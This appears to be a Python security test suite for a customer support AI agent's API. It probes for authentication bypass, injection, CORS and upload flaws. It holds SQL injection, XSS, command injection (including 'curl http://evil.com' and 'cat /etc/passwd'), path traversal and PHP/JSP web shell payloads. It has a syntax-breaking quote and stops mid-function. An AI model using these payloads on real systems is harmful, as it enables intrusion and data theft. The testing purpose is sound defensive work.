#!/usr/bin/env python3
"""
Security Test Suite for Customer Support AI Agent

This comprehensive security test suite performs vulnerability assessments and security
validation including authentication bypass tests, authorization checks, input validation,
injection attack testing, CORS security, rate limiting validation, and security header
verification.

Features:
- Authentication and authorization testing
- Input validation and injection attack testing
- SQL injection vulnerability detection
- XSS (Cross-Site Scripting) prevention testing
- CSRF (Cross-Site Request Forgery) protection
- Security header validation
- CORS configuration security assessment
- Rate limiting and DoS protection testing
- File upload security validation
- Sensitive data exposure testing
- Session management security
- API security and access control
- WebSocket security testing
- Configuration security review

Usage:
    python security_test.py [--host HOST] [--port PORT] [--test-type TYPE] [--verbose] [--report-format FORMAT]
"""

import asyncio
import requests
import time
import logging
import sys
import json
import argparse
import re
import hashlib
import secrets
import tempfile
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from contextlib import asynccontextmanager
import xml.etree.ElementTree as ET

@dataclass
class SecurityTestConfig:
    """Security test configuration."""
    base_url: str = "http://localhost:8000"
    ws_url: str = "ws://localhost:8000/ws"
    test_type: str = "comprehensive"  # comprehensive, auth, injection, headers, cors
    timeout: int = 15
    max_redirects: int = 5
    verbose: bool = False
    output_file: Optional[str] = None
    report_format: str = "json"  # json, html, text
    test_user: str = "test_user"
    test_password: str = "test_password"
    
class SecurityVulnerability:
    """Security vulnerability information."""
    
    def __init__(self, severity: str, category: str, title: str, description: str, 
                 evidence: str = "", recommendation: str = "", cve_id: str = ""):
        self.severity = severity  # Critical, High, Medium, Low, Info
        self.category = category
        self.title = title
        self.description = description
        self.evidence = evidence
        self.recommendation = recommendation
        self.cve_id = cve_id
        self.timestamp = datetime.now()
        
    def to_dict(self) -> Dict[str, Any]:
        """Convert vulnerability to dictionary."""
        return {
            'severity': self.severity,
            'category': self.category,
            'title': self.title,
            'description': self.description,
            'evidence': self.evidence,
            'recommendation': self.recommendation,
            'cve_id': self.cve_id,
            'timestamp': self.timestamp.isoformat()
        }

class SecurityTestSuite:
    """Comprehensive security test suite."""
    
    def __init__(self, config: SecurityTestConfig):
        self.config = config
        self.logger = self._setup_logging()
        self.session = requests.Session()
        self.session.timeout = config.timeout
        self.session.max_redirects = config.max_redirects
        self.vulnerabilities = []
        self.test_results = {}
        self.auth_token = None
        
        # Security test payloads
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "' OR 1=1#",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "|| echo 'injected'",
            "`id`",
            "$(whoami)",
            "; curl http://evil.com",
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
    def _setup_logging(self) -> logging.Logger:
        """Setup security test logging."""
        logger = logging.getLogger('security_tests')
        logger.setLevel(logging.DEBUG if self.config.verbose else logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            
        return logger
    
    def add_vulnerability(self, vulnerability: SecurityVulnerability):
        """Add a vulnerability to the list."""
        self.vulnerabilities.append(vulnerability)
        self.logger.warning(f"[{vulnerability.severity}] {vulnerability.title}: {vulnerability.description}")
    
    def _make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make HTTP request with proper headers."""
        url = f"{self.config.base_url}{endpoint}"
        
        # Add security headers
        headers = kwargs.get('headers', {})
        headers.update({
            'User-Agent': 'SecurityTest/1.0',
            'Accept': '*/*',
        })
        
        if self.auth_token:
            headers['Authorization'] = f"Bearer {self.auth_token}"
        
        kwargs['headers'] = headers
        return self.session.request(method, url, **kwargs)
    
    def test_authentication_bypass(self) -> Dict[str, Any]:
        """Test authentication bypass attempts."""
        self.logger.info("Testing authentication bypass...")
        
        results = {
            'test_name': 'Authentication Bypass',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test protected endpoints without authentication
        protected_endpoints = [
            '/auth/me',
            '/sessions',
            '/admin',
            '/api/admin',
            '/upload',
            '/rag/documents'
        ]
        
        for endpoint in protected_endpoints:
            try:
                response = self._make_request('GET', endpoint)
                
                if response.status_code == 200:
                    self.add_vulnerability(SecurityVulnerability(
                        severity='HIGH',
                        category='Authentication',
                        title='Authentication Bypass',
                        description=f'Endpoint {endpoint} accessible without authentication',
                        evidence=f'Status Code: {response.status_code}'
                    ))
                    results['vulnerabilities'].append(f'Endpoint {endpoint} bypasses authentication')
                    results['status'] = 'FAIL'
                elif response.status_code == 401:
                    self.logger.info(f"✓ Endpoint {endpoint} properly requires authentication")
                elif response.status_code == 403:
                    self.logger.info(f"✓ Endpoint {endpoint} properly forbidden")
                else:
                    self.logger.warning(f"Unexpected status for {endpoint}: {response.status_code}")
                    
            except Exception as e:
                self.logger.error(f"Error testing {endpoint}: {e}")
        
        # Test SQL injection in login
        login_payloads = [
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': "' OR '1'='1", 'password': 'anything'},
            {'username': 'admin'; DROP TABLE users;--', 'password': 'anything'},
        ]
        
        for payload in login_payloads:
            try:
                response = self._make_request('POST', '/auth/login', json=payload)
                
                if response.status_code == 200:
                    data = response.json()
                    if 'access_token' in data:
                        self.add_vulnerability(SecurityVulnerability(
                            severity='CRITICAL',
                            category='Authentication',
                            title='SQL Injection in Login',
                            description='SQL injection possible in login endpoint',
                            evidence=f'Payload: {payload}',
                            recommendation='Use parameterized queries and input validation'
                        ))
                        results['vulnerabilities'].append('SQL injection in login endpoint')
                        results['status'] = 'FAIL'
                        
            except Exception as e:
                self.logger.error(f"Error testing login injection: {e}")
        
        return results
    
    def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation and injection attacks."""
        self.logger.info("Testing input validation...")
        
        results = {
            'test_name': 'Input Validation',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test SQL injection in various endpoints
        endpoints_to_test = [
            {'endpoint': '/chat', 'method': 'POST', 'data': {'message': ''}},
            {'endpoint': '/sessions', 'method': 'GET'},
            {'endpoint': '/rag/query', 'method': 'POST', 'data': {'query': ''}},
        ]
        
        for sql_payload in self.sql_injection_payloads:
            for test_case in endpoints_to_test:
                try:
                    if test_case['method'] == 'POST':
                        data = test_case['data'].copy()
                        for key in data:
                            if isinstance(data[key], str):
                                data[key] = sql_payload
                        
                        response = self._make_request('POST', test_case['endpoint'], json=data)
                    else:
                        response = self._make_request('GET', test_case['endpoint'])
                    
                    # Check for SQL error indicators
                    response_text = response.text.lower()
                    sql_errors = [
                        'sql syntax error',
                        'mysql_fetch',
                        'postgresql error',
                        'ora-00933',
                        'microsoft ole db',
                        'sqlite_error',
                        'syntax error near'
                    ]
                    
                    for error in sql_errors:
                        if error in response_text:
                            self.add_vulnerability(SecurityVulnerability(
                                severity='CRITICAL',
                                category='Input Validation',
                                title='SQL Injection Vulnerability',
                                description=f'Possible SQL injection in {test_case["endpoint"]}',
                                evidence=f'Payload: {sql_payload}, Response contains SQL error',
                                recommendation='Use parameterized queries, input sanitization, and validation'
                            ))
                            results['vulnerabilities'].append(f'SQL injection in {test_case["endpoint"]}')
                            results['status'] = 'FAIL'
                            break
                            
                except Exception as e:
                    self.logger.error(f"Error testing SQL injection in {test_case['endpoint']}: {e}")
        
        # Test XSS in input fields
        xss_endpoints = [
            {'endpoint': '/chat', 'method': 'POST', 'data': {'message': ''}},
            {'endpoint': '/sessions', 'method': 'POST', 'data': {'user_id': '', 'metadata': {}}},
            {'endpoint': '/upload', 'method': 'POST'},
        ]
        
        for xss_payload in self.xss_payloads:
            for test_case in xss_endpoints:
                try:
                    if test_case['method'] == 'POST':
                        if test_case['endpoint'] == '/sessions':
                            data = test_case['data'].copy()
                            data['user_id'] = xss_payload
                            data['metadata'] = {'test': xss_payload}
                        else:
                            data = test_case['data'].copy()
                            if 'message' in data:
                                data['message'] = xss_payload
                        
                        response = self._make_request('POST', test_case['endpoint'], json=data)
                    else:
                        response = self._make_request('GET', test_case['endpoint'])
                    
                    # Check if payload is reflected
                    if xss_payload in response.text:
                        self.add_vulnerability(SecurityVulnerability(
                            severity='HIGH',
                            category='Input Validation',
                            title='Cross-Site Scripting (XSS)',
                            description=f'Possible XSS vulnerability in {test_case["endpoint"]}',
                            evidence=f'Payload reflected in response: {xss_payload}',
                            recommendation='Implement proper input validation, output encoding, and Content Security Policy'
                        ))
                        results['vulnerabilities'].append(f'XSS in {test_case["endpoint"]}')
                        results['status'] = 'FAIL'
                        
                except Exception as e:
                    self.logger.error(f"Error testing XSS in {test_case['endpoint']}: {e}")
        
        return results
    
    def test_command_injection(self) -> Dict[str, Any]:
        """Test command injection vulnerabilities."""
        self.logger.info("Testing command injection...")
        
        results = {
            'test_name': 'Command Injection',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test command injection in various parameters
        test_endpoints = [
            {'endpoint': '/chat', 'method': 'POST', 'data': {'message': ''}},
            {'endpoint': '/rag/query', 'method': 'POST', 'data': {'query': ''}},
        ]
        
        for cmd_payload in self.command_injection_payloads:
            for test_case in test_endpoints:
                try:
                    data = test_case['data'].copy()
                    for key in data:
                        if isinstance(data[key], str):
                            data[key] = cmd_payload
                    
                    response = self._make_request('POST', test_case['endpoint'], json=data)
                    
                    # Check for command execution indicators
                    response_text = response.text.lower()
                    cmd_indicators = [
                        'uid=',
                        'gid=',
                        'groups=',
                        'root:',
                        'bin/bash',
                        'total ',
                        'drwxr-xr',
                        'http://evil.com'
                    ]
                    
                    for indicator in cmd_indicators:
                        if indicator in response_text:
                            self.add_vulnerability(SecurityVulnerability(
                                severity='CRITICAL',
                                category='Command Injection',
                                title='Command Injection Vulnerability',
                                description=f'Possible command injection in {test_case["endpoint"]}',
                                evidence=f'Payload: {cmd_payload}, Indicator: {indicator}',
                                recommendation='Use subprocess with shell=False, input validation, and command whitelisting'
                            ))
                            results['vulnerabilities'].append(f'Command injection in {test_case["endpoint"]}')
                            results['status'] = 'FAIL'
                            break
                            
                except Exception as e:
                    self.logger.error(f"Error testing command injection in {test_case['endpoint']}: {e}")
        
        return results
    
    def test_path_traversal(self) -> Dict[str, Any]:
        """Test path traversal vulnerabilities."""
        self.logger.info("Testing path traversal...")
        
        results = {
            'test_name': 'Path Traversal',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test path traversal in file upload
        test_payloads = self.path_traversal_payloads
        
        for payload in test_payloads:
            try:
                # Create a malicious filename
                malicious_filename = f"../../../etc/passwd.txt"
                
                # Test file upload with malicious filename
                response = self._make_request('POST', '/upload', 
                                            files={'file': (malicious_filename, 'test content')})
                
                # Check if path traversal is successful
                if response.status_code == 200:
                    data = response.json()
                    if 'filename' in data:
                        uploaded_filename = data['filename']
                        
                        # Check if the filename contains path traversal
                        if '../' in uploaded_filename or '..\\' in uploaded_filename:
                            self.add_vulnerability(SecurityVulnerability(
                                severity='HIGH',
                                category='Path Traversal',
                                title='Path Traversal in File Upload',
                                description='Path traversal vulnerability in file upload endpoint',
                                evidence=f'Payload: {payload}, Uploaded filename: {uploaded_filename}',
                                recommendation='Implement proper file path validation and use secure filename generation'
                            ))
                            results['vulnerabilities'].append('Path traversal in file upload')
                            results['status'] = 'FAIL'
                            
            except Exception as e:
                self.logger.error(f"Error testing path traversal: {e}")
        
        return results
    
    def test_security_headers(self) -> Dict[str, Any]:
        """Test security headers configuration."""
        self.logger.info("Testing security headers...")
        
        results = {
            'test_name': 'Security Headers',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        try:
            response = self._make_request('GET', '/health')
            
            # Required security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': ['1; mode=block', '0'],
                'Strict-Transport-Security': None,  # Should be present in production
                'Content-Security-Policy': None,
                'Referrer-Policy': None,
            }
            
            for header, expected_values in security_headers.items():
                header_value = response.headers.get(header)
                
                if header_value is None:
                    # Some headers are optional in development
                    if header in ['Strict-Transport-Security', 'Content-Security-Policy']:
                        self.logger.info(f"Optional header {header} not present (acceptable in development)")
                    else:
                        self.add_vulnerability(SecurityVulnerability(
                            severity='MEDIUM',
                            category='Security Headers',
                            title='Missing Security Header',
                            description=f'Missing required security header: {header}',
                            recommendation=f'Add {header} header to responses'
                        ))
                        results['vulnerabilities'].append(f'Missing header: {header}')
                        results['status'] = 'FAIL'
                else:
                    if expected_values and isinstance(expected_values, list):
                        if header_value not in expected_values:
                            self.add_vulnerability(SecurityVulnerability(
                                severity='LOW',
                                category='Security Headers',
                                title='Security Header Value Issue',
                                description=f'Header {header} has non-recommended value: {header_value}',
                                recommendation=f'Set {header} to one of: {expected_values}'
                            ))
                            results['vulnerabilities'].append(f'Suboptimal header value: {header}')
                    
                    self.logger.info(f"✓ Header {header}: {header_value}")
                    
        except Exception as e:
            self.logger.error(f"Error testing security headers: {e}")
            results['error'] = str(e)
        
        return results
    
    def test_cors_configuration(self) -> Dict[str, Any]:
        """Test CORS configuration security."""
        self.logger.info("Testing CORS configuration...")
        
        results = {
            'test_name': 'CORS Configuration',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        try:
            # Test CORS with malicious origin
            malicious_origin = 'http://evil.com'
            headers = {
                'Origin': malicious_origin,
                'Access-Control-Request-Method': 'POST',
                'Access-Control-Request-Headers': 'Content-Type,Authorization'
            }
            
            response = self._make_request('OPTIONS', '/health', headers=headers)
            
            # Check CORS headers
            allow_origin = response.headers.get('Access-Control-Allow-Origin')
            allow_credentials = response.headers.get('Access-Control-Allow-Credentials')
            
            if allow_origin == '*':
                self.add_vulnerability(SecurityVulnerability(
                    severity='HIGH',
                    category='CORS',
                    title='Wildcard CORS Origin',
                    description='CORS allows wildcard (*) origin which is insecure',
                    evidence=f'Access-Control-Allow-Origin: {allow_origin}',
                    recommendation='Specify exact allowed origins instead of using wildcards'
                ))
                results['vulnerabilities'].append('Wildcard CORS origin')
                results['status'] = 'FAIL'
            elif allow_origin == malicious_origin:
                self.add_vulnerability(SecurityVulnerability(
                    severity='CRITICAL',
                    category='CORS',
                    title='Malicious Origin Allowed',
                    description=f'CORS allows malicious origin: {malicious_origin}',
                    evidence=f'Access-Control-Allow-Origin: {allow_origin}',
                    recommendation='Remove malicious origin from allowed origins list'
                ))
                results['vulnerabilities'].append(f'Malicious origin allowed: {malicious_origin}')
                results['status'] = 'FAIL'
            else:
                self.logger.info(f"✓ CORS origin properly restricted: {allow_origin or 'Not set'}")
            
            # Check credentials header
            if allow_credentials == 'true' and allow_origin == '*':
                self.add_vulnerability(SecurityVulnerability(
                    severity='CRITICAL',
                    category='CORS',
                    title='CORS with Credentials and Wildcard Origin',
                    description='CORS allows credentials with wildcard origin',
                    recommendation='Never use wildcard origin with credentials enabled'
                ))
                results['vulnerabilities'].append('CORS credentials with wildcard origin')
                results['status'] = 'FAIL'
                
        except Exception as e:
            self.logger.error(f"Error testing CORS: {e}")
            results['error'] = str(e)
        
        return results
    
    def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting and DoS protection."""
        self.logger.info("Testing rate limiting...")
        
        results = {
            'test_name': 'Rate Limiting',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        try:
            # Make rapid requests to test rate limiting
            endpoint = '/health'
            num_requests = 50
            response_times = []
            
            start_time = time.time()
            
            for i in range(num_requests):
                request_start = time.time()
                response = self._make_request('GET', endpoint)
                request_end = time.time()
                
                response_times.append(request_end - request_start)
                
                # Check for rate limiting headers
                if response.status_code == 429:
                    self.logger.info(f"✓ Rate limiting active after {i+1} requests")
                    break
                elif response.status_code >= 500:
                    self.logger.warning(f"Server error after {i+1} requests: {response.status_code}")
                    break
            
            end_time = time.time()
            total_time = end_time - start_time
            
            # Analyze results
            if response.status_code != 429:
                # Check if server became unresponsive
                if response.status_code >= 500:
                    self.add_vulnerability(SecurityVulnerability(
                        severity='HIGH',
                        category='Rate Limiting',
                        title='No Rate Limiting Protection',
                        description='Server became unresponsive under load without rate limiting',
                        evidence=f'Server error {response.status_code} after {num_requests} requests',
                        recommendation='Implement rate limiting to prevent DoS attacks'
                    ))
                    results['vulnerabilities'].append('No rate limiting protection')
                    results['status'] = 'FAIL'
                else:
                    # Check for other DoS indicators
                    avg_response_time = sum(response_times) / len(response_times)
                    if avg_response_time > 5.0:  # 5 second threshold
                        self.add_vulnerability(SecurityVulnerability(
                            severity='MEDIUM',
                            category='Rate Limiting',
                            title='Potential DoS Vulnerability',
                            description='Server response time degraded significantly under load',
                            evidence=f'Average response time: {avg_response_time:.2f}s',
                            recommendation='Consider implementing rate limiting and performance optimization'
                        ))
                        results['vulnerabilities'].append('Degraded performance under load')
                        results['status'] = 'FAIL'
                    else:
                        self.logger.info(f"✓ Server handled {num_requests} requests without degradation")
            else:
                self.logger.info("✓ Rate limiting is properly configured")
                
        except Exception as e:
            self.logger.error(f"Error testing rate limiting: {e}")
            results['error'] = str(e)
        
        return results
    
    def test_session_security(self) -> Dict[str, Any]:
        """Test session management security."""
        self.logger.info("Testing session security...")
        
        results = {
            'test_name': 'Session Security',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        try:
            # Test session creation
            session_data = {
                'user_id': self.config.test_user,
                'metadata': {'source': 'security_test'}
            }
            
            response = self._make_request('POST', '/sessions', json=session_data)
            
            if response.status_code == 200:
                session_info = response.json()
                session_id = session_info.get('session_id')
                
                if session_id:
                    # Test session fixation
                    if len(session_id) < 20:  # Weak session ID
                        self.add_vulnerability(SecurityVulnerability(
                            severity='MEDIUM',
                            category='Session Security',
                            title='Weak Session ID',
                            description='Session ID is too short and predictable',
                            evidence=f'Session ID: {session_id}',
                            recommendation='Use cryptographically secure random session IDs (minimum 128 bits)'
                        ))
                        results['vulnerabilities'].append('Weak session ID')
                        results['status'] = 'FAIL'
                    else:
                        self.logger.info(f"✓ Session ID appears secure (length: {len(session_id)})")
                    
                    # Test session manipulation
                    manipulated_id = session_id + "extra"
                    response = self._make_request('GET', f'/sessions/{manipulated_id}')
                    
                    if response.status_code == 200:
                        self.add_vulnerability(SecurityVulnerability(
                            severity='HIGH',
                            category='Session Security',
                            title='Session ID Manipulation',
                            description='Session ID can be manipulated to access other sessions',
                            evidence=f'Manipulated ID: {manipulated_id}',
                            recommendation='Validate session IDs and implement proper session management'
                        ))
                        results['vulnerabilities'].append('Session ID manipulation possible')
                        results['status'] = 'FAIL'
                    else:
                        self.logger.info("✓ Session ID manipulation properly rejected")
                        
            else:
                self.logger.info("Session endpoint not available for testing")
                
        except Exception as e:
            self.logger.error(f"Error testing session security: {e}")
            results['error'] = str(e)
        
        return results
    
    def test_file_upload_security(self) -> Dict[str, Any]:
        """Test file upload security."""
        self.logger.info("Testing file upload security...")
        
        results = {
            'test_name': 'File Upload Security',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test malicious file types
        malicious_files = [
            ('malware.exe', b'MZ\x90\x00'),  # Fake PE executable
            ('script.php', b'<?php system($_GET["cmd"]); ?>'),  # PHP script
            ('script.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),  # JSP script
            ('large_file.txt', b'x' * (10 * 1024 * 1024)),  # 10MB file (size limit test)
        ]
        
        for filename, content in malicious_files:
            try:
                # Create temporary file
                with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
                    tmp_file.write(content)
                    tmp_file.flush()
                    
                    # Test upload
                    with open(tmp_file.name, 'rb') as f:
                        files = {'file': (filename, f)}
                        response = self._make_request('POST', '/upload', files=files)
                    
                    # Check response
                    if response.status_code == 200:
                        self.add_vulnerability(SecurityVulnerability(
                            severity='HIGH',
                            category='File Upload',
                            title='Insecure File Upload',
                            description=f'Potentially dangerous file type accepted: {filename}',
                            evidence=f'File accepted: {filename}, Size: {len(content)} bytes',
                            recommendation='Implement strict file type validation and security scanning'
                        ))
                        results['vulnerabilities'].append(f'Unsafe file accepted: {filename}')
                        results['status'] = 'FAIL'
                    else:
                        self.logger.info(f"✓ Malicious file {filename} properly rejected")
                        
            except Exception as e:
                self.logger.error(f"Error testing file upload security for {filename}: {e}")
        
        return results
    
    def test_information_disclosure(self) -> Dict[str, Any]:
        """Test information disclosure vulnerabilities."""
        self.logger.info("Testing information disclosure...")
        
        results = {
            'test_name': 'Information Disclosure',
            'vulnerabilities': [],
            'status': 'PASS'
        }
        
        # Test for sensitive information in responses
        endpoints_to_test = ['/health', '/docs', '/openapi.json', '/auth/login']
        sensitive_patterns = [
            r'password[:\s]*\S+',
            r'secret[:\s]*\S+',
            r'key[:\s]*\S+',
            r'token[:\s]*\S+',
            r'api_key[:\s]*\S+',
            r'database.*url',
            r'connection.*string',
        ]
        
        for endpoint in endpoints_to_test:
            try:
                response = self._make_request('GET', endpoint)
                
                if response.status_code == 200:
                    response_text = response.text
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response_text, re.IGNORECASE)
                        if matches:
                            self.add_vulnerability(SecurityVulnerability(
                                severity='MEDIUM',
                                category='Information Disclosure',
                                title='Sensitive Information Exposure',
                                description=f'Sensitive information found in {endpoint}',
                                evidence=f'Matches: {matches}',
                                recommendation='Remove or mask sensitive information from API responses'
                            ))
                            results['vulnerabilities'].append(f'Sensitive data in {endpoint}')
                            results['status'] = 'FAIL'
                            break
                            
            except Exception as e:
                self.logger.error(f"Error testing information disclosure for {endpoint}: {e}")
        
        # Test for debug information
        try:
            response = self._make_request('GET', '/debug')
            
            if response.status_code == 200:
                self.add_vulnerability(SecurityVulnerability(
                    severity='MEDIUM',
                    category='Information Disclosure',
                    title='Debug Endpoint Exposed',
                    description='Debug endpoint is accessible',
                    recommendation='Disable debug endpoints in production'
                ))
                results['vulnerabilities'].append('Debug endpoint exposed')
                results['status'] = 'FAIL'
                
        except Exception as e:
            self.logger.info(f"Debug endpoint not available: {e}")
        
        return results
    
    def generate_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report."""
        
        # Calculate severity distribution
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
        for vuln in self.vulnerabilities:
            severity_counts[vuln.severity] += 1
        
        # Calculate category distribution
        category_counts = {}
        for vuln in self.vulnerabilities:
            category_counts[vuln.category] = category_counts.get(vuln.category, 0) + 1
        
        # Overall security score (0-100)
        max_score = 100
        deduction = (
            severity_counts['Critical'] * 25 +
            severity_counts['High'] * 15 +
            severity_counts['Medium'] * 10 +
            severity_counts['Low'] * 5
        )
        security_score = max(0, max_score - deduction)
        
        # Determine overall status
        if severity_counts['Critical'] > 0:
            overall_status = 'CRITICAL'
        elif severity_counts['High'] > 0:
            overall_status = 'FAIL'
        elif severity_counts['Medium'] > 0:
            overall_status = 'WARN'
        else:
            overall_status = 'PASS'
        
        report = {
            'test_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'severity_distribution': severity_counts,
                'category_distribution': category_counts,
                'security_score': security_score,
                'overall_status': overall_status,
                'test_timestamp': datetime.now().isoformat()
            },
            'test_configuration': {
                'base_url': self.config.base_url,
                'test_type': self.config.test_type,
                'timeout': self.config.timeout
            },
            'vulnerabilities': [vuln.to_dict() for vuln in self.vulnerabilities],
            'test_results': self.test_results,
            'recommendations': self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        
        # Based on vulnerability categories found
        categories_found = set(vuln.category for vuln in self.vulnerabilities)
        
        if 'Authentication' in categories_found:
            recommendations.append("Implement strong authentication mechanisms and use parameterized queries")
        
        if 'Input Validation' in categories_found:
            recommendations.append("Implement comprehensive input validation and output encoding")
        
        if 'Security Headers' in categories_found:
            recommendations.append("Configure security headers according to OWASP recommendations")
        
        if 'CORS' in categories_found:
            recommendations.append("Configure CORS properly with specific allowed origins")
        
        if 'Rate Limiting' in categories_found:
            recommendations.append("Implement rate limiting to prevent DoS attacks")
        
        if 'File Upload' in categories_found:
            recommendations.append("Implement strict file type validation and security scanning")
        
        if 'Session Security' in categories_found:
            recommendations.append("Use cryptographically secure session management")
        
        # General recommendations
        recommendations.extend([
            "Regular security testing and vulnerability assessments",
            "Keep dependencies updated and patch known vulnerabilities",
            "Implement security monitoring and logging",
            "Follow OWASP security guidelines",
            "Consider penetration testing by security professionals"
        ])
        
        return recommendations
    
    def save_report(self, report: Dict[str, Any]):
        """Save security report to file."""
        if self.config.output_file:
            if self.config.report_format == 'json':
                with open(self.config.output_file, 'w') as f:
                    json.dump(report, f, indent=2)
            elif self.config.report_format == 'html':
                self._save_html_report(report, self.config.output_file)
            
            self.logger.info(f"Security report saved to: {self.config.output_file}")
    
    def _save_html_report(self, report: Dict[str, Any], filename: str):
        """Save report in HTML format."""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #f5f5f5; padding: 20px; border-radius: 5px; }}
        .vulnerability {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }}
        .critical {{ border-left: 5px solid #d32f2f; }}
        .high {{ border-left: 5px solid #f57c00; }}
        .medium {{ border-left: 5px solid #fbc02d; }}
        .low {{ border-left: 5px solid #388e3c; }}
        .severity {{ font-weight: bold; }}
        .summary {{ background: #e3f2fd; padding: 15px; margin: 20px 0; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Security Test Report</h1>
        <p>Generated: {report['test_summary']['test_timestamp']}</p>
        <p>Target: {report['test_configuration']['base_url']}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <p>Total Vulnerabilities: {report['test_summary']['total_vulnerabilities']}</p>
        <p>Security Score: {report['test_summary']['security_score']}/100</p>
        <p>Overall Status: {report['test_summary']['overall_status']}</p>
    </div>
    
    <h2>Vulnerabilities</h2>
"""
        
        for vuln in report['vulnerabilities']:
            html_content += f"""
    <div class="vulnerability {vuln['severity'].lower()}">
        <h3>{vuln['title']} ({vuln['severity']})</h3>
        <p><strong>Category:</strong> {vuln['category']}</p>
        <p><strong>Description:</strong> {vuln['description']}</p>
        <p><strong>Evidence:</strong> {vuln['evidence']}</p>
        <p><strong>Recommendation:</strong> {vuln['recommendation']}</p>
    </div>
"""
        
        html_content += """
</body>
</html>
"""
        
        with open(filename, 'w') as f:
            f.write(html_content)
    
    def print_summary(self, report: Dict[str, Any]):
        """Print security test summary."""
        summary = report['test_summary']
        
        print(f"\n{'='*80}")
        print(f"SECURITY TEST SUMMARY")
        print(f"{'='*80}")
        print(f"Target: {report['test_configuration']['base_url']}")
        print(f"Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print(f"Security Score: {summary['security_score']}/100")
        print(f"Overall Status: {summary['overall_status']}")
        
        print(f"\nSeverity Distribution:")
        for severity, count in summary['severity_distribution'].items():
            if count > 0:
                print(f"  {severity}: {count}")
        
        if summary['total_vulnerabilities'] > 0:
            print(f"\nTop Vulnerabilities:")
            for i, vuln in enumerate(report['vulnerabilities'][:5], 1):
                print(f"  {i}. [{vuln['severity']}] {vuln['title']}")
            
            if len(report['vulnerabilities']) > 5:
                print(f"  ... and {len(report['vulnerabilities']) - 5} more")
        
        print(f"\nRecommendations:")
        for i, rec in enumerate(report['recommendations'][:5], 1):
            print(f"  {i}. {rec}")
    
    async def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """Run comprehensive security test suite."""
        self.logger.info("Starting comprehensive security test suite...")
        
        # Define test sequence
        test_sequence = [
            ("Authentication Bypass", self.test_authentication_bypass),
            ("Input Validation", self.test_input_validation),
            ("Command Injection", self.test_command_injection),
            ("Path Traversal", self.test_path_traversal),
            ("Security Headers", self.test_security_headers),
            ("CORS Configuration", self.test_cors_configuration),
            ("Rate Limiting", self.test_rate_limiting),
            ("Session Security", self.test_session_security),
            ("File Upload Security", self.test_file_upload_security),
            ("Information Disclosure", self.test_information_disclosure),
        ]
        
        # Run tests
        for test_name, test_func in test_sequence:
            try:
                self.logger.info(f"Running {test_name}...")
                result = test_func()
                self.test_results[test_name] = result
            except Exception as e:
                self.logger.error(f"Error in {test_name}: {e}")
                self.test_results[test_name] = {'error': str(e), 'status': 'ERROR'}
        
        # Generate final report
        report = self.generate_security_report()
        
        return report

def main():
    """Main function to run security tests."""
    parser = argparse.ArgumentParser(description='Customer Support AI Agent Security Tests')
    parser.add_argument('--host', default='localhost', help='API host (default: localhost)')
    parser.add_argument('--port', type=int, default=8000, help='API port (default: 8000)')
    parser.add_argument('--test-type', 
                       choices=['comprehensive', 'auth', 'injection', 'headers', 'cors', 'all'], 
                       default='comprehensive', help='Type of security test')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    parser.add_argument('--output', help='Output file for test results')
    parser.add_argument('--format', choices=['json', 'html', 'text'], default='json', 
                       help='Report format')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Configure test
    config = SecurityTestConfig(
        base_url=f"http://{args.host}:{args.port}",
